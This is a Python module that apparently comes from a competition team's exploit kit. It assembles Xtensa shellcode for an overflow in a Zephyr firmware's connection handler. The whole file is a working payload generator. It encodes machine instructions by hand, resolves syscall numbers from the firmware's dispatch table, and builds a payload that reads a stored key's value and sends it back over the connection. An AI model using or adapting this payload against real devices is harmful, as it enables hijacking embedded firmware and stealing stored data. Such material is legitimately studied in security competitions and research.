"""Xtensa shellcode payload for the connection handler overflow.

This is way over-engineered for actual in-competition use,
but it works even if we update the firmware.
"""

from __future__ import annotations

import struct

from . import firmware, overflow

SERVICE_OFFSET = overflow.BUFFER_SIZE  # Right behind frame[]
FRAME = 7  # Frame base is in a7

CALL_ARGUMENT_REGISTERS = (10, 11, 12)  # callx8 leaves them here
SYSCALL_ARGUMENT_REGISTERS = (6, 3, 4, 5)  # Zephyr's Xtensa ABI; call number and result both in a2
SYSCALL_TABLE = "_k_syscall_table"

KEY_AT = 96
VALUE_AT = 128


class ShellcodeError(ValueError):
    """Failed to assemble the payload."""


def _word(value: int) -> bytes:
    """Encodes one 24-bit instruction."""
    return struct.pack("<I", value)[:3]


def movi(at: int, imm: int) -> bytes:
    """Emits `movi <at>, <imm>`."""
    if not -2048 <= imm <= 2047:
        raise ShellcodeError(f"movi takes a 12 bit signed immediate, got {imm}")
    imm &= 0xFFF
    return _word(((imm & 0xFF) << 16) | (0xA << 12) | ((imm >> 8) << 8) | (at << 4) | 0x2)


def add(ar: int, as_: int, at: int) -> bytes:
    """Emits `add <ar>, <as>, <at>`."""
    return _word((0x8 << 20) | (ar << 12) | (as_ << 8) | (at << 4))


def mov(ar: int, as_: int) -> bytes:
    """Emits `or <ar>, <as>, <as>`, i.e., `mov <ar>, <as>`."""
    return _word((0x2 << 20) | (ar << 12) | (as_ << 8) | (as_ << 4))


def slli(ar: int, as_: int, shift: int) -> bytes:
    """Emits `slli <ar>, <as>, <shift>`."""
    if not 1 <= shift <= 31:
        raise ShellcodeError("Invalid shift for slli")
    sa = 32 - shift
    return _word((((sa >> 4) & 1) << 20) | (1 << 16) | (ar << 12) | (as_ << 8) | ((sa & 0xF) << 4))


def addmi(ar: int, as_: int, imm8: int) -> bytes:
    """Emits `addmi <ar>, <as>, <imm8>` (`ar = as + (imm8 << 8)`)."""
    if not -128 <= imm8 <= 127:
        raise ShellcodeError("Invalid immediate for addmi")
    return _word(((imm8 & 0xFF) << 16) | (0xD << 12) | (as_ << 8) | (ar << 4) | 0x2)


def addi(ar: int, as_: int, imm8: int) -> bytes:
    """Emits `addi <ar>, <as>, <imm8>`."""
    if not -128 <= imm8 <= 127:
        raise ShellcodeError("Invalid immediate for addi")
    return _word(((imm8 & 0xFF) << 16) | (0xC << 12) | (as_ << 8) | (ar << 4) | 0x2)


def jx(as_: int) -> bytes:
    """Emits `jx <as_>`"""
    return _word((as_ << 8) | (0xA << 4))


SYSCALL = _word(0x005000)
NOP = _word(0x0020F0)  # Zephyr puts one after every syscall (arch/xtensa/syscall.h)


def at_frame(ar: int, offset: int) -> bytes:
    """Loads `frame + offset` into `ar`."""
    return movi(ar, offset) + add(ar, FRAME, ar)


def constant(ar: int, value: int) -> bytes:
    """Builds `value` in `ar` without a literal pool."""
    if not 0 <= value <= 0x7FFFFF:
        raise ShellcodeError(f"Cannot build {value:#x} in registers")
    if -2048 <= value <= 2047:
        return movi(ar, value)

    out = movi(ar, value >> 12) + slli(ar, ar, 12)
    step, rest = (value & 0xFFF) >> 8, value & 0xFF
    if rest > 127:
        step, rest = step + 1, rest - 256
    if step:
        out += addmi(ar, ar, step)
    if rest:
        out += addi(ar, ar, rest)
    return out


def syscall_number(name: str) -> int:
    """Looks up the syscall number of `name` in the firmware's dispatch table."""
    image = firmware.image()
    marshaller = image.function(f"z_mrsh_{name}", within=None)
    address, size = image.symbol(SYSCALL_TABLE)
    table = struct.unpack(f"<{size // 4}I", image.read(address, size))
    if marshaller not in table:
        raise ShellcodeError(f"{name} is not reachable from user mode in this firmware")
    return table.index(marshaller)


def read_key(key: bytes, *, at: int, value_size: int) -> bytes:
    """Assembles one payload that reads the store entry under `key` and answers with it."""
    code = _read_key_code(key, key_offset=at + KEY_AT, value_offset=at + VALUE_AT, value_size=value_size)
    if len(code) > KEY_AT or KEY_AT + len(key) > VALUE_AT:
        raise ShellcodeError(f"{len(code)} bytes of code and a {len(key)} byte key do not fit the layout")
    return code.ljust(KEY_AT, b"\0") + key.ljust(VALUE_AT - KEY_AT, b"\0") + bytes(value_size)


def _read_key_code(key: bytes, *, key_offset: int, value_offset: int, value_size: int) -> bytes:
    read = syscall_number("atmlab_user_data_read")
    send_reply = firmware.image().function("send_reply")
    arg_key, arg_key_len, arg_value, arg_value_size = SYSCALL_ARGUMENT_REGISTERS
    service, reply, reply_length = CALL_ARGUMENT_REGISTERS

    return b"".join(
        [
            movi(FRAME, -SERVICE_OFFSET),
            add(FRAME, service, FRAME),
            # atmlab_user_data_read(key, key_len, value, value_size)
            at_frame(arg_key, key_offset),
            movi(arg_key_len, len(key)),
            at_frame(arg_value, value_offset),
            movi(arg_value_size, value_size),
            movi(2, read),
            SYSCALL,
            NOP,
            # send_reply(&c.service, value, bytes_read), in the registers its ENTRY rotates down
            mov(reply_length, 2),
            at_frame(service, SERVICE_OFFSET),
            at_frame(reply, value_offset),
            constant(5, send_reply),
            jx(5),
        ]
    )
